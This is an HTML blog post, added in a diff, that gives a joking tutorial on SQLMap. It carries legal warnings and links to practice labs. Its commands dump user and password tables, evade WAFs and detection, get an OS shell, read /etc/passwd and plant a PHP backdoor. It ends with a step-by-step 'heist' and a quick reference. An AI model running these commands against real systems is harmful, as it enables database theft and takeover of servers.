@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQLMap : Teaching legacy apps new ways to cry | Caspian</title>
+    <link rel="stylesheet" href="../style.css">
+</head>
+<body>
+    <header>
+        <div class="container">
+            <h1>CASPIAN</h1>
+            <p class="tagline">// TECH_LOG & DAILY_EXPERIENCES //</p>
+        </div>
+    </header>
+    <main>
+        <div class="container">
+            <a href="../index.html" class="back-link">← Back to all posts</a>
+            <article>
+                <div class="post-header">
+                    <h1>SQLMap : Teaching legacy apps new ways to cry</h1>
+                    <div class="post-meta">November 1, 2025</div>
+                </div>
+                <div class="post-content">
+                <h2>So What the Hell Is This Thing Anyway?</h2>
+                <p>
+                    SQLMap is an open-source penetration testing tool that automates SQL injection attacks. It's basically a 
+                    robot that goes around knocking on database doors saying "excuse me, are you vulnerable?" and when the 
+                    database says "yes," SQLMap kicks the door down and steals everything that isn't nailed down. It's what 
+                    happens when someone got tired of manually typing <code>1' OR '1'='1</code> into login forms like a caveman.
+                </p>
+                
+                <p>
+                    Think of it as a Swiss Army knife, except instead of tools, it's full of database exploitation techniques, 
+                    and instead of camping, you're using it for authorized security testing (you ARE authorized, right? RIGHT?)
+                </p>
+
+                <hr>
+
+                <h2>Getting This Beast on Your Arch System (Because Simple Tasks Deserve Complicated Names)</h2>
+                
+                <h3>The "I Actually Value My Time" Method</h3>
+                <pre><code>sudo pacman -S sqlmap</code></pre>
+                <p>
+                    Wow. Look at that. One command. On Arch. Something that doesn't require you to manually compile from source 
+                    while reading a 47-page wiki article. Mark this day in your calendar.
+                </p>
+
+                <h3>The "I Need Bleeding Edge Because Stable Is For Peasants" Method</h3>
+                <pre><code>git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+cd sqlmap-dev
+python sqlmap.py --wizard</code></pre>
+                <p>
+                    For those who need to live on the edge. Because nothing says "I'm a professional" like using software that 
+                    might have been committed to Git 4 minutes ago by someone who was probably drunk.
+                </p>
+
+                <h3>Verify This Actually Installed</h3>
+                <pre><code>sqlmap --version</code></pre>
+                <p>
+                    If this returns an error, congratulations, you've managed to break Python on a system where Python is 
+                    literally required for the package manager to work. That's talent.
+                </p>
+
+                <hr>
+
+                <h2>Your First Steps into SQL Injection (Or: "How I Learned to Stop Worrying and Love the Database")</h2>
+                
+                <h3>Hold My Hand Mode</h3>
+                <pre><code>sqlmap --wizard</code></pre>
+                <p>
+                    SQLMap will literally walk you through everything like you're a toddler learning to use a toilet. There's no 
+                    shame in this. Actually, scratch that, there's a little shame. But it works, so who cares?
+                </p>
+
+                <h3>Testing If Something Is Even Vulnerable</h3>
+                <pre><code>sqlmap -u "http://testsite.com/page.php?id=1"</code></pre>
+                <p>
+                    This is SQLMap's way of saying "hey website, are you injectable?" It'll poke and prod that URL parameter like 
+                    a curious child with a dead bug. If the site is vulnerable, SQLMap will tell you. If it's not, SQLMap will 
+                    tell you that too, along with making you feel like you wasted your time.
+                </p>
+
+                <h3>What All That Spew Actually Means</h3>
+                <p>
+                    SQLMap vomits information at you like it's trying to impress you with how smart it is. You'll see:
+                </p>
+                <ul>
+                    <li>Testing parameters (it's trying different injection points)</li>
+                    <li>Payload attempts (the actual malicious SQL it's injecting)</li>
+                    <li>
+                        Backend DBMS detection (is it MySQL? PostgreSQL? MS SQL? Oracle? That one weird database your uncle uses?)
+                    </li>
+                    <li>Vulnerability confirmation (THE GOOD PART - "yes, this is exploitable")</li>
+                    <li>About 500 lines of other crap you'll scroll past</li>
+                </ul>
+
+                <hr>
+
+                <h2>Actually Stealing Data (The "I'm Kind of Getting This" Phase)</h2>
+
+                <h3>Show Me All the Databases</h3>
+                <pre><code>sqlmap -u "http://testsite.com/page.php?id=1" --dbs</code></pre>
+                <p>
+                    This command lists every database on the server. It's like asking for the table of contents before you rob a 
+                    library. Very polite of you.
+                </p>
+
+                <h3>What's Inside This Database?</h3>
+                <pre><code>sqlmap -u "http://testsite.com/page.php?id=1" -D database_name --tables</code></pre>
+                <p>
+                    Replace 'database_name' with an actual database name unless you want SQLMap to give you an error message that 
+                    makes you feel stupid. This shows all the tables, which is where the actual data lives. Look for tables named 
+                    things like 'users', 'customers', 'credit_cards', or 'definitely_not_passwords'.
+                </p>
+
+                <h3>What Columns Are in This Table?</h3>
+                <pre><code>sqlmap -u "http://testsite.com/page.php?id=1" -D database_name -T table_name --columns</code></pre>
+                <p>
+                    Getting warmer. Now you can see what data fields exist. This is where you find the good stuff like 'password', 
+                    'email', 'ssn', and 'mothers_maiden_name'. You know, the kind of stuff that makes identity theft possible 
+                    (which you're obviously not doing because you're ethical, RIGHT?)
+                </p>
+
+                <h3>Give Me the Actual Data Already</h3>
+                <pre><code>sqlmap -u "http://testsite.com/page.php?id=1" -D database_name -T users -C username,password --dump</code></pre>
+                <p>
+                    THE MOMENT YOU'VE BEEN WAITING FOR. This dumps the actual data. Usernames, passwords, everything. SQLMap will 
+                    even be nice enough to crack password hashes for you automatically because why not? It's already doing all the 
+                    heavy lifting.
+                </p>
+
+                <hr>
+
+                <h2>POST Requests and Other Things That Make You Look Professional</h2>
+
+                <h3>Because Not Everything Is a GET Request (Shocking, I Know)</h3>
+                <pre><code>sqlmap -u "http://testsite.com/login.php" --data="username=admin&password=test"</code></pre>
+                <p>
+                    POST parameters exist. Who knew? Developers who still use GET for login forms should be ashamed of themselves, 
+                    but they exist, and so do POST parameters. This is how you test them.
+                </p>
+
+                <h3>When You Need to Actually Be Logged In</h3>
+                <pre><code>sqlmap -u "http://testsite.com/page.php?id=1" --cookie="PHPSESSID=abc123def456"</code></pre>
+                <p>
+                    Right-click, Inspect Element, Application tab, Cookies. Copy your session cookie. Paste it here. SQLMap will 
+                    now masquerade as you. Identity theft, but make it ethical.
+                </p>
+
+                <h3>Authentication Headers (For APIs and Other Modern Nonsense)</h3>
+                <pre><code>sqlmap -u "http://testsite.com/api/user/1" --headers="Authorization: Bearer your_token_here"</code></pre>
+                <p>
+                    APIs think they're fancy with their Bearer tokens and OAuth. SQLMap doesn't care. Give it the token, watch it 
+                    work. Simple.
+                </p>
+
+                <hr>
+
+                <h2>The "I Actually Know What I'm Doing Now" Arsenal</h2>
+
+                <h3>Request Files (For People Who Use Burp Suite Like Adults)</h3>
+                <pre><code>sqlmap -r request.txt</code></pre>
+                <p>
+                    Intercept a request in Burp Suite. Save it to a file. Feed it to SQLMap. This is what professionals do because 
+                    manually typing out headers is for people who hate themselves.
+                </p>
+                
+                <p>Your request.txt should look like this:</p>
+                <pre><code>POST /login HTTP/1.1
+Host: testsite.com
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=abc123
+
+username=admin&password=test</code></pre>
+                <p>
+                    SQLMap reads this and tests EVERYTHING. Every parameter, every header, every cookie. It's thorough to the 
+                    point of being annoying.
+                </p>
+
+                <h3>Stop Testing Everything, Just Test This One Thing</h3>
+                <pre><code>sqlmap -u "http://testsite.com/page.php?id=1&lang=en&page=home" -p id</code></pre>
+                <p>
+                    The -p flag means "only test THIS parameter, I don't care about the others." Saves time. Makes you look like 
+                    you know what you're doing. Win-win.
+                </p>
+
+                <h3>Turning Up the Violence (Level and Risk)</h3>
+                <pre><code>sqlmap -u "http://testsite.com/page.php?id=1" --level=5 --risk=3</code></pre>
+                <p>
+                    <strong>Level (1-5):</strong> How many tests to run. Level 1 is "just checking." Level 5 is "leave no stone 
+                    unturned, test EVERYTHING including that weird header nobody uses."
+                </p>
+                <p>
+                    <strong>Risk (1-3):</strong> How dangerous the payloads are. Risk 3 might actually UPDATE or DELETE data. 
+                    Don't use this on production unless you want to update your resume.
+                </p>
+
+                <h3>I Know What Database This Is, Stop Guessing</h3>
+                <pre><code>sqlmap -u "http://testsite.com/page.php?id=1" --dbms=MySQL</code></pre>
+                <p>
+                    If you already know it's MySQL (maybe you saw it in an error message, or you're not an idiot), tell SQLMap. 
+                    It'll skip the whole "is it Oracle? Is it PostgreSQL? Is it MS SQL?" dance and get straight to exploitation. 
+                    Efficiency.
+                </p>
+
+                <h3>Bypassing WAFs (Web Application Firewalls, or "Why Can't I Have Nice Things?")</h3>
+                <pre><code>sqlmap -u "http://testsite.com/page.php?id=1" --tamper=space2comment</code></pre>
+                <p>
+                    WAFs are those annoying security devices that block obvious attacks. Tamper scripts modify your payloads to 
+                    sneak past them. It's like disguising yourself to get past a bouncer, except the bouncer is code and you're 
+                    using more code.
+                </p>
+                
+                <p>Popular tamper scripts:</p>
+                <ul>
+                    <li><strong>space2comment:</strong> Replaces spaces with SQL comments (/**/)</li>
+                    <li><strong>between:</strong> Uses BETWEEN instead of greater-than/less-than</li>
+                    <li><strong>charencode:</strong> URL encodes everything like paranoia</li>
+                    <li><strong>randomcase:</strong> Makes SQL keywords look drunk (sElEcT * FrOm UsErS)</li>
+                </ul>
+                
+                <p>Chain them together like you're building a Rube Goldberg machine:</p>
+                <pre><code>sqlmap -u "http://testsite.com/page.php?id=1" --tamper=space2comment,between,randomcase</code></pre>
+
+                <h3>Pick Your Injection Technique (For Control Freaks)</h3>
+                <pre><code>sqlmap -u "http://testsite.com/page.php?id=1" --technique=BEUSTQ</code></pre>
+                <p>SQLMap has six injection techniques. Each letter is one technique:</p>
+                <ul>
+                    <li><strong>B:</strong> Boolean-based blind (true/false queries)</li>
+                    <li><strong>E:</strong> Error-based (make the database throw informative errors)</li>
+                    <li><strong>U:</strong> Union query-based (the classic)</li>
+                    <li><strong>S:</strong> Stacked queries (multiple queries at once)</li>
+                    <li><strong>T:</strong> Time-based blind (if this then wait 5 seconds)</li>
+                    <li><strong>Q:</strong> Inline queries (the hipster method)</li>
+                </ul>
+                <p>
+                    Want only time-based? <code>--technique=T</code>. Want everything? <code>--technique=BEUSTQ</code>. Want to 
+                    feel smart? Pick some random combination.
+                </p>
+
+                <hr>
+
+                <h2>Full Root Access (Or: "How to Completely Own a Server in 5 Minutes")</h2>
+
+                <h3>Getting an Actual Shell on the Server</h3>
+                <pre><code>sqlmap -u "http://testsite.com/page.php?id=1" --os-shell</code></pre>
+                <p>
+                    If the database user has FILE privileges (which they shouldn't, but developers are lazy), SQLMap will upload a 
+                    web shell and give you command execution on the server. At this point you've transcended SQL injection and 
+                    entered "I literally control this server" territory. Type commands, get results. It's beautiful. It's 
+                    terrifying. It's probably illegal unless you have permission.
+                </p>
+
+                <h3>Reading Files Off the Server</h3>
+                <pre><code>sqlmap -u "http://testsite.com/page.php?id=1" --file-read="/etc/passwd"</code></pre>
+                <p>
+                    /etc/passwd is the classic. Shows all user accounts. On Windows, try reading C:\Windows\win.ini just to prove 
+                    you can. Want config files with database passwords? Try /var/www/html/config.php. The possibilities are 
+                    endless and deeply concerning.
+                </p>
+
+                <h3>Writing Files to the Server (Because Reading Wasn't Enough)</h3>
+                <pre><code>sqlmap -u "http://testsite.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"</code></pre>
+                <p>
+                    Upload your own PHP backdoor. Now you don't even need SQLMap anymore, you have permanent access. This is the 
+                    "plant a flag at the summit" moment. Obviously only do this on systems you own or have written permission to 
+                    test. Prison orange is not a good look on anyone.
+                </p>
+
+                <h3>Running Whatever SQL You Want</h3>
+                <pre><code>sqlmap -u "http://testsite.com/page.php?id=1" --sql-query="SELECT user,password FROM mysql.user"</code></pre>
+                <p>
+                    Direct SQL execution. Want to see all MySQL users? Done. Want to create a new admin account? Go for it. Want 
+                    to DROP ALL TABLES? You monster. But yes, you could. Don't.
+                </p>
+
+                <h3>Checking Your Privilege (Literally)</h3>
+                <pre><code>sqlmap -u "http://testsite.com/page.php?id=1" --privileges</code></pre>
+                <p>
+                    See what the database user can do. If you see FILE, SUPER, or DBA permissions, congratulations, you've hit the 
+                    jackpot. If you see nothing interesting, well, at least you still have the data.
+                </p>
+
+                <h3>Reconnaissance (Know Your Enemy)</h3>
+                <pre><code>sqlmap -u "http://testsite.com/page.php?id=1" --current-user --current-db --hostname</code></pre>
+                <p>
+                    Who am I? Where am I? What database am I in? It's like SQLMap is having an existential crisis, except the 
+                    answers actually matter.
+                </p>
+
+                <hr>
+
+                <h2>The Secret Menu (Things They Don't Tell You in Tutorials)</h2>
+
+                <h3>Stop Asking Me Questions Mode</h3>
+                <pre><code>sqlmap -u "http://testsite.com/page.php?id=1" --batch</code></pre>
+                <p>
+                    SQLMap asks more questions than a 4-year-old. "Should I test this parameter? Should I try this technique? Do 
+                    you want to save session data? Do you want fries with that?" --batch tells it to shut up and use default 
+                    answers for everything. Perfect for automation or when you just can't be bothered.
+                </p>
+
+                <h3>Tell Me EVERYTHING (Verbose Mode)</h3>
+                <pre><code>sqlmap -u "http://testsite.com/page.php?id=1" -v 3</code></pre>
+                <p>
+                    Verbosity levels go from 0 (silent as a mime) to 6 (never stops talking). Level 3 shows HTTP requests and 
+                    responses. Level 6 shows your entire life story. Use this when you're debugging or when you want to pretend 
+                    you understand what's happening.
+                </p>
+
+                <h3>Multithreading (Because Waiting Is for Suckers)</h3>
+                <pre><code>sqlmap -u "http://testsite.com/page.php?id=1" --threads=10</code></pre>
+                <p>
+                    Run 10 simultaneous connections. Makes things faster. Also makes you look like you're DDoSing the target. Some 
+                    WAFs will ban you. Some admins will notice. Use with caution, or don't, I'm not your mom.
+                </p>
+
+                <h3>Using a Proxy (For Burp Integration or Just Being Paranoid)</h3>
+                <pre><code>sqlmap -u "http://testsite.com/page.php?id=1" --proxy="http://127.0.0.1:8080"</code></pre>
+                <p>
+                    Route everything through Burp Suite to see what SQLMap is doing. Or route through Tor if you're being paranoid 
+                    (you're not anonymous though, stop thinking you are). Or route through your corporate proxy because your 
+                    company loves monitoring you.
+                </p>
+
+                <h3>Pretending You're Not SQLMap</h3>
+                <pre><code>sqlmap -u "http://testsite.com/page.php?id=1" --random-agent</code></pre>
+                <p>
+                    By default, SQLMap's User-Agent header literally says "sqlmap/1.0" which is about as subtle as wearing a shirt 
+                    that says "I AM HACKING YOU." This flag makes it pretend to be a normal browser. Much better for not getting 
+                    caught immediately.
+                </p>
+
+                <h3>Being Polite (Delay Between Requests)</h3>
+                <pre><code>sqlmap -u "http://testsite.com/page.php?id=1" --delay=2</code></pre>
+                <p>
+                    Wait 2 seconds between each request. Good for avoiding rate limits. Good for avoiding detection. Good for when 
+                    you're not in a hurry and want to be nice to the server (how considerate of you).
+                </p>
+
+                <h3>Resuming After You Screwed Up</h3>
+                <pre><code>sqlmap -u "http://testsite.com/page.php?id=1" --resume</code></pre>
+                <p>
+                    SQLMap crashed? Your laptop died? You accidentally closed the terminal? No problem. SQLMap saves everything in 
+                    ~/.local/share/sqlmap (because Arch has to be different). Resume from where you left off like nothing 
+                    happened.
+                </p>
+
+                <h3>Saving Output (For Your Pentest Report You'll Definitely Write)</h3>
+                <pre><code>sqlmap -u "http://testsite.com/page.php?id=1" --output-dir="/home/youruser/sqlmap-results"</code></pre>
+                <p>
+                    Save everything to a specific folder. Professional pentesters do this so they can write reports later. You do 
+                    this because you'll forget what you did in 10 minutes. Both are valid reasons.
+                </p>
+
+                <hr>
+
+                <h2>Putting It All Together (A Complete Heist)</h2>
+                <p>
+                    Here's how you actually use this tool in the real world (legally, with permission, don't email me from jail):
+                </p>
+
+                <h3>Step 1: Is This Thing Even Vulnerable?</h3>
+                <pre><code>sqlmap -u "http://target.com/product.php?id=5" --batch --random-agent</code></pre>
+                <p>
+                    Basic vulnerability check. If this says "not vulnerable," you're done. Go home. If it says "vulnerable," 
+                    you've got work to do.
+                </p>
+
+                <h3>Step 2: What Databases Exist?</h3>
+                <pre><code>sqlmap -u "http://target.com/product.php?id=5" --batch --dbs</code></pre>
+                <p>
+                    Make a list. Look for interesting names like 'ecommerce', 'users', 'customers', or 'totally_not_credit_cards'.
+                </p>
+
+                <h3>Step 3: What Tables Are in the Interesting Database?</h3>
+                <pre><code>sqlmap -u "http://target.com/product.php?id=5" --batch -D ecommerce --tables</code></pre>
+                <p>
+                    Narrowing it down. You want tables named 'users', 'admins', 'customers', 'payment_info'. Avoid tables like 
+                    'logs' or 'sessions' unless you like wasting time.
+                </p>
+
+                <h3>Step 4: What's In This Table?</h3>
+                <pre><code>sqlmap -u "http://target.com/product.php?id=5" --batch -D ecommerce -T users --columns</code></pre>
+                <p>
+                    Column names tell you everything. If you see 'password', 'credit_card', 'ssn', 'secret_key', you've struck 
+                    gold.
+                </p>
+
+                <h3>Step 5: TAKE EVERYTHING</h3>
+                <pre><code>sqlmap -u "http://target.com/product.php?id=5" --batch -D ecommerce -T users --dump</code></pre>
+                <p>
+                    The data dump. Sit back, watch SQLMap work. It'll extract everything and even crack password hashes for you. 
+                    How nice.
+                </p>
+
+                <h3>Step 6: Can We Go Further?</h3>
+                <pre><code>sqlmap -u "http://target.com/product.php?id=5" --batch --os-shell</code></pre>
+                <p>
+                    The nuclear option. If this works, you've completely compromised the server. If it doesn't work, you still got 
+                    the database which is pretty good. Either way, you win.
+                </p>
+
+                <hr>
+
+                <h2>When Things Go Wrong (And They Will)</h2>
+
+                <h3>"All tested parameters do not appear to be injectable"</h3>
+                <p>SQLMap's polite way of saying "I got nothing." This means either:</p>
+                <ul>
+                    <li>It's actually not vulnerable (possible but disappointing)</li>
+                    <li>There's a WAF blocking you (try --tamper scripts)</li>
+                    <li>You need to increase --level and --risk (go to 5 and 3)</li>
+                    <li>You forgot to include cookies/headers (are you logged in?)</li>
+                    <li>The injection point is somewhere weird (try --level=5)</li>
+                </ul>
+                <p>Don't give up immediately. Try harder before accepting defeat.</p>
+
+                <h3>"Connection timeout to the target URL"</h3>
+                <p>The server is ignoring you. Possible reasons:</p>
+                <ul>
+                    <li>You've been IP banned (congrats, you were too obvious)</li>
+                    <li>Rate limiting kicked in (add --delay=2 or more)</li>
+                    <li>Too many threads (reduce to --threads=1)</li>
+                    <li>The server is actually down (not your fault for once)</li>
+                    <li>Your internet sucks (probably this)</li>
+                </ul>
+
+                <h3>"I Somehow Broke Python"</h3>
+                <p>
+                    On Arch, this shouldn't be possible because Arch NEEDS Python to function. But if you managed it:
+                </p>
+                <pre><code>sudo pacman -S python python-pip --overwrite '*'</code></pre>
+                <p>
+                    If that doesn't work, you've entered the danger zone. Check the Arch forums. Prepare for condescending 
+                    responses. Good luck, brave soldier.
+                </p>
+
+                <h3>"WAF Detected"</h3>
+                <p>SQLMap found a Web Application Firewall. Your options:</p>
+                <pre><code>sqlmap -u "URL" --tamper=space2comment,between --random-agent --delay=2</code></pre>
+                <p>
+                    If that doesn't work, try different tamper scripts. If THAT doesn't work, maybe it's time to try manual 
+                    injection. Or give up. Both are valid strategies.
+                </p>
+
+                <hr>
+
+                <h2>The Legal Stuff (Read This or Talk to a Lawyer Later)</h2>
+                <p><strong>YOU MAY ONLY USE SQLMAP ON:</strong></p>
+                <ul>
+                    <li>Systems you own</li>
+                    <li>Systems where you have WRITTEN permission to test</li>
+                    <li>Legal practice environments (HackTheBox, TryHackMe, DVWA, etc.)</li>
+                </ul>
+                
+                <br>
+                
+                <p><strong>DO NOT USE SQLMAP ON:</strong></p>
+                <ul>
+                    <li>Your school network (expulsion is not a fun experience)</li>
+                    <li>Your work network without explicit authorization (unemployment is also not fun)</li>
+                    <li>Random websites (prison is definitely not fun)</li>
+                    <li>Your ex's website (prison + civil lawsuit = really not fun)</li>
+                    <li>Anything where you don't have permission (sensing a pattern?)</li>
+                </ul>
+
+                <p>
+                    "I was just testing the security" is not a legal defense. Neither is "I didn't think I'd actually get in." 
+                    Neither is "I was going to tell them after." Get permission FIRST, in WRITING, or stick to legal labs.
+                </p>
+                
+                <p>
+                    The Computer Fraud and Abuse Act doesn't care about your intentions. The law doesn't care that you're a 
+                    curious hobbyist. Judges don't care that you use Arch btw. Don't be stupid.
+                </p>
+
+                <hr>
+
+                <h2>Where to Practice Without Becoming a Felon</h2>
+                <ul>
+                    <li>
+                        <strong>DVWA (Damn Vulnerable Web App):</strong> Install it locally, break it, reinstall it, break it 
+                        again. It's therapeutic.
+                    </li>
+                    <li>
+                        <strong>SQLi Labs:</strong> 75 lessons specifically about SQL injection. Perfect for learning every 
+                        technique.
+                    </li>
+                    <li>
+                        <strong>HackTheBox:</strong> Legal hacking playground. Costs money but worth it. You can break stuff 
+                        guilt-free.
+                    </li>
+                    <li>
+                        <strong>TryHackMe:</strong> Like HackTheBox but more beginner-friendly and less elitist.
+                    </li>
+                    <li>
+                        <strong>PortSwigger Web Security Academy:</strong> Free, excellent, comprehensive. No excuses not to use 
+                        this.
+                    </li>
+                    <li>
+                        <strong>PentesterLab:</strong> Focused exercises. Gets progressively harder. Also free tier available.
+                    </li>
+                </ul>
+
+                <hr>
+
+                <h2>Quick Reference (Because Your Memory Sucks)</h2>
+                <pre><code># Basic vulnerability scan
+sqlmap -u "URL"
+
+# With cookies (logged in)
+sqlmap -u "URL" --cookie="SESSION=xyz"
+
+# POST request testing
+sqlmap -u "URL" --data="param=value"
+
+# List all databases
+sqlmap -u "URL" --dbs
+
+# List tables in a database
+sqlmap -u "URL" -D database_name --tables
+
+# List columns in a table
+sqlmap -u "URL" -D database_name -T table_name --columns
+
+# Dump specific columns
+sqlmap -u "URL" -D database_name -T table_name -C column1,column2 --dump
+
+# Dump entire table
+sqlmap -u "URL" -D database_name -T table_name --dump
+
+# Get OS shell
+sqlmap -u "URL" --os-shell
+
+# Full automatic mode (YOLO)
+sqlmap -u "URL" --batch --random-agent --level=5 --risk=3
+
+# WAF bypass attempt
+sqlmap -u "URL" --tamper=space2comment,between --random-agent --delay=2
+
+# Read file from server
+sqlmap -u "URL" --file-read="/etc/passwd"
+
+# Write file to server
+sqlmap -u "URL" --file-write="shell.php" --file-dest="/var/www/shell.php"
+
+# Use request file (from Burp)
+sqlmap -r request.txt --batch
+
+# Through a proxy
+sqlmap -u "URL" --proxy="http://127.0.0.1:8080"
+
+# Specific injection technique
+sqlmap -u "URL" --technique=T
+
+# Test only specific parameter
+sqlmap -u "URL" -p parameter_name
+
+# Current user and database info
+sqlmap -u "URL" --current-user --current-db --hostname</code></pre>
+
+                <hr>
+
+                <h2>Parting Wisdom (TL;DR)</h2>
+                <p>
+                    SQLMap turns SQL injection from a tedious manual process into a "press button, receive database" experience. 
+                    It's stupidly powerful. It automates attacks that would take hours into minutes. It's the difference between 
+                    learning to pick locks and just using a battering ram.
+                </p>
+
+                <p>
+                    Learn this tool well and you'll understand SQL injection better than most developers who write the vulnerable 
+                    code in the first place. You'll find vulnerabilities in minutes that would take others hours. You'll look like 
+                    a wizard to people who don't know what they're doing.
+                </p>
+
+                <p>
+                    But remember: this tool is a weapon. A very effective weapon. Use it responsibly, ethically, and legally. Get 
+                    permission before testing anything. Document everything. Write reports. Be professional.
+                </p>
+
+                <p>Or don't, and learn about the criminal justice system firsthand. Your choice.</p>
+
+                <p>
+                    Now go forth and exploit (legally). And for the love of Linus Torvalds, remember to update your system 
+                    occasionally.
+                </p>
+
+                <pre><code>sudo pacman -Syu</code></pre>
+
+                <p>
+                    <em>
+                        I use Arch btw. Did I mention that? Because I use Arch. Just so you know. Arch Linux. That's what I use.
+                    </em>
+                </p>
+
+                <hr>
+
+                <p>
+                    <small>
+                        Disclaimer: This guide is for educational purposes only. The author assumes no responsibility for your 
+                        poor life choices, legal troubles, or inability to read a disclaimer. If you get arrested, you're on your 
+                        own. Don't email me from prison. I won't respond. Seriously.
+                    </small>
+                </p>
+                </div>
+            </article>
+            <a href="../index.html" class="back-link">← Back to all posts</a>
+        </div>
+    </main>
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 Caspian | Built with &lt;code&gt; and ☕</p>
+        </div>
+    </footer>
+</body>
+</html>
